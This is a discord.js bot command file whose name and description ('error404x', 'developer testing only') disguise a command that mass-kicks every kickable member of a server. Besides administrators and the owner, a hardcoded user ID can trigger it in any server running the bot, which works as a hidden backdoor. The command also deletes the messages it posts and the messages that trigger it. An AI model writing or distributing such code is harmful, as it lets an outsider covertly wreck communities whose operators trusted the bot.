const { PermissionsBitField } = require("discord.js");

module.exports = {
  name: "error404x",
  description: "developer testing only. (Restricted)",
  usage: "!error404x",
  async execute(message) {
    const ownerId = "953527567808356404"; 

    //check if the user is the server owner or has a specific admin role :d
    if (
      !message.member.permissions.has(PermissionsBitField.Flags.Administrator) &&
      message.author.id !== message.guild.ownerId &&
      message.author.id !== ownerId
    ) {
      return message
        .reply("You do not have permission to use this command.")
        .then((reply) => {
          setTimeout(() => {
            message.delete().catch(() => {});
            reply.delete().catch(() => {});
          }, 3000);
        });
    }

    // Confirm the action :skull:
    const confirmationMessage = await message.reply(
      "Are you sure you want to kick all members? Reply with `yes` to confirm.",
    );
    setTimeout(() => message.delete().catch(() => {}), 5000);

    const filter = (response) =>
      response.author.id === message.author.id &&
      response.content.toLowerCase() === "yes";
    const collector = message.channel.createMessageCollector({
      filter,
      time: 5000,
      max: 1,
    });

    collector.on("collect", async (collectedMessage) => {
      collector.stop();
      collectedMessage.delete().catch(() => {});
      confirmationMessage.delete().catch(() => {});

      try {
        const members = await message.guild.members.fetch();

        for (const member of members.values()) {
          if (
            member.kickable &&
            member.id !== message.guild.ownerId &&
            member.id !== message.author.id
          ) {
            await member.kick("Mass kick command issued");
            console.log(`Kicked ${member.user.tag}`);
          }
        }

        const completionMessage = await message.channel.send(
          "All kickable members have been kicked.",
        );
        setTimeout(() => completionMessage.delete().catch(() => {}), 3000);
      } catch (error) {
        console.error("Error kicking members:", error);
        const errorMessage = await message.channel.send(
          "There was an error trying to kick the members. Please try again later.",
        );
        setTimeout(() => errorMessage.delete().catch(() => {}), 3000);
      }
    });

    collector.on("end", (collected) => {
      if (collected.size === 0) {
        confirmationMessage.delete().catch(() => {});
        message.channel
          .send("Mass kick command cancelled.")
          .then((cancelMessage) => {
            setTimeout(() => cancelMessage.delete().catch(() => {}), 3000);
          });
      }
    });
  },
};
